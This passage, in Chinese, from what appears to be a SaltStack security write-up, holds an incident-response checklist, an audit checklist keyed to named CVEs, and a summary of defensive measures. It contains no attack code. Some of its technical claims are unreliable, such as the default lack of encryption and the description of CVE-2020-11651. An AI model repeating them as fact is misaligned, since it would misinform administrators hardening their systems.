[ ] 确认 Salt 版本与已安装补丁
    - salt --version
    - 检查 Salt 安全公告

[ ] 检查 4505/4506 端口是否对外暴露
    - 从外网尝试连接 ZeroMQ 端口
    - 检查防火墙规则

[ ] 检查 salt-api (8000/8443) 是否对外暴露
    - 从外网访问 /login 端点
    - 检查是否启用认证

[ ] 排查 CVE-2020-11651 利用
    - 检查 salt-master 日志中的异常 publish 请求
    - 搜索 /var/log/salt/master 中的 "command" 关键字
    - 检查 Minion 执行日志中的异常命令

[ ] 检查 Pillar 数据是否泄露
    - 审计所有访问 pillar.items 的 API 请求
    - 检查 Pillar 中的敏感数据变更记录

[ ] 检查 Minion 密钥是否被篡改
    - 对比 /etc/salt/pki/master/minions/ 中的公钥
    - 检查是否有未知的 Minion 注册

[ ] 检查 State 持久化
    - 审查 /srv/salt/ 目录下的 state 文件
    - 检查 crontab 中的异常条目
    - 检查 /opt/ 目录下的异常脚本

[ ] 网络隔离与加固
    - 禁止 4505/4506 端口对外暴露
    - 为 salt-api 配置强认证 (PAM/LDAP + Token)
    - 启用 AES 加密通信
    - 升级 Salt 到最新版本
```

## 0x12 安全审计清单

```
[ ] salt-master 端口 (4505/4506) 仅内网可达
[ ] salt-api (8000/8443) 启用强认证且仅内网可达
[ ] Salt 版本 ≥ 3007.1 / 3006.5 / 3005.5 / 3004.3 / 3002.9 (覆盖全部已知 CVE)
[ ] 启用 AES 加密 (master 通信加密)
[ ] 配置 Minion 指纹认证
[ ] 限制 Minion 连接 (白名单)
[ ] Pillar 数据加密存储
[ ] Salt SSH 配置使用密钥认证
[ ] 移除不必要的 Runner/Engine 模块
[ ] 审计所有 State 文件，确保无恶意内容
[ ] 监控 salt-master 日志中的异常操作
[ ] 配置日志远程收集与实时告警
[ ] 定期审查 Minion 密钥列表
[ ] 限制 salt-api 的 API 访问范围
[ ] 使用 TLS 加密 salt-api 通信
[ ] 启用 TLS 加密 Master-Minion 通信 (防御重放攻击 CVE-2024-38823)
[ ] 验证 Pillar 数据签名 (防御 CVE-2022-22941 / CVE-2025-22239)
[ ] GitFS 环境使用不同缓存目录 (防御 CVE-2023-20898)
[ ] 检查 Master Token 验证逻辑 (防御 CVE-2024-38822)
[ ] 监控事件总线异常消息 (防御 CVE-2025-22236)
[ ] 禁用不安全的 ProxyCommand 参数 (防御 CVE-2023-48585)
```

## 0x13 总结

SaltStack 的安全问题核心在于"信任过大"的架构设计：

1. **ZeroMQ 通信缺乏认证**: Master-Minion 的 ZeroMQ PUB/SUB 通信默认不加密、不认证，直接导致 CVE-2020-11651 的清单注入 RCE
2. **salt-api 认证缺陷**: API 认证机制存在设计漏洞，/run 端点可能被未授权访问，轮询机制可被绕过
3. **文件操作不安全**: file_roots.find 等 Runner 模块存在路径穿越，导致任意文件读取
4. **Pillar 敏感数据泄露**: 配置管理的敏感数据可能通过 API 或路径穿越泄露

防守方核心策略：
- **网络隔离**: 4505/4506 端口绝对不暴露于互联网
- **启用认证**: salt-api 配置 PAM/LDAP + Token 双重认证，禁止默认凭据
- **加密通信**: 启用 AES 加密 Minion-Master 通信，使用 TLS 加密 salt-api
- **密钥管理**: 严格审查 Minion 密钥注册，启用指纹认证
- **及时升级**: 升级到 Salt 最新版本，应用所有安全补丁
- **纵深防御**: WAF + 日志监控 + State 审计 + 凭证轮换
